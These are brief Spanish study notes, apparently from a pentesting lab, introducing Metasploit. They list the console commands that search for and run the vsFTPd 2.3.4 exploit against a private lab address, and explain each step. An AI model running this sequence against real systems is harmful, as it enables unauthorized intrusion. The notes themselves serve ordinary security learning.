Metasploit es una herramienta que nos ayuda a realizar intrusiones a maquinas con su base de datos de exploits
```metasploit
search vsFTPd 2.3.4
use 0
show options
set RHOSTS 10.0.2.9
run
```
1. search ...
	1. Busca exploits en base a su nombre CVE, versión y sistema que introduzcas
2. use
	1. Para elegir que exploits utilizar
3. show options
	1. Para ver que tenemos que configurar para el exploit
4. set ... ...
	1. Para configurar lo que sea necesario
5. run | exploit
	1. Para ejecutar el exploits